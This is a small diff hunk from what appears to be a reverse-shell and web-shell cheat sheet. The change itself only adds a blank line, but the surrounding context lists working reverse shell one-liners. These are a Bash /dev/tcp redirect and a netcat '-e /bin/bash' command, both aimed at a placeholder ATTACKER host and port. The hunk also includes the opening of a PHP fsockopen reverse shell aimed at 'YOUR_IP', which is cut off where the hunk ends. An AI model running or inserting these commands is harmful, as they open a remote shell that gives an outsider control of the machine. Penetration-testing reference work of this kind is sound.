@@ -18,6 +18,7 @@ A more feature-rich PHP web shell with file management and command execution, am
 - Bash: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
 - Netcat (if present): `nc -e /bin/bash ATTACKER PORT`
 - PHP:
+
   ```php
   <?php
 	$sock = fsockopen("YOUR_IP", 8001);
